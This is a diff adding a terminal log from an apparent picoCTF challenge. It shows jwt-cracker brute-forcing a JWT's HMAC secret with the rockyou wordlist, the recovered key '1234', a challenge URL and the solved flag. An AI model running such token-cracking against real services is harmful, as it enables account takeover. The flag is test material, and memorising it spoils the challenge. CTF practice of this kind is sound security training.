@@ -1,0 +1,8 @@
+┌─[cristian@Prestige-13-AI]─[~]
+└──╼ $ jwt-cracker -t eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc3Nzk2ODE3NywiaWF0IjoxNzc3MzYzMzc3LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.a_csXe5EW-SskpSypelkz4rp1cOLy6wQUUB7zOrqf5Q -d /usr/share/wordlists/rockyou.txt
+SECRET FOUND: 1234
+Time taken (sec): 0.162
+Total attempts: 20000
+
+http://saturn.picoctf.net:59876/base/books/pdf/5
+picoCTF{w34k_jwt_n0t_g00d_ca4d9701}
